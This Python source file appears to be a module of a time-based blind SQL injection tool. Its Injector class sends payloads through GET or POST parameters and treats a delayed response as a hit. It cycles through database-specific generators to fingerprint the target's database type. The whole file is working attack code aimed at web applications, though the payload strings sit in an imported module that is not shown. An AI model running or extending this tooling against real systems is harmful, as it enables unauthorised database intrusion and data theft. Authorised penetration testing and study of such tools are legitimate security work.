import requests
import tqdm
import time

from http_ import DefaultHttpClient
from generator import Generators


from rich.progress import track
import time

class GetTypeError(Exception): pass
class NoTypeDetectedError(GetTypeError): pass

class Injector():
    def __init__(self, client: DefaultHttpClient):
        self.client = client

    def inject(self, url, method, input, payload):
        res = None
        
        if method == 'GET':
            # url = url
            res = requests.get(url, params={input: payload})
        elif method == 'POST':
            res = requests.post(url, data={input: payload})
        
        t1 = self.client.default_time(requests.get(url))
        t = self.client.check_time(res, t1 + 0.5)
        # print(t1, res.elapsed.total_seconds())
        return not t
    
    def findType(self, url, method, input, delay_command, form: str):
        with tqdm.tqdm(total=len(Generators), desc=f"[{time.strftime('%X')}] DBMS") as pbar:
            for type, generator in Generators.items():
                pbar.set_description(f"[{time.strftime('%X')}] DBMS")
                pbar.update(1)
                command = form.format(toexec=generator.generateTypeCheck().format(delay_command=delay_command))
                if self.inject(url, method, input, command):
                    pbar.set_description(f"[{time.strftime('%X')}] DBMS")
                    pbar.update(pbar.total-pbar.n)
                    return type
            raise NoTypeDetectedError("No DBMS Detected.")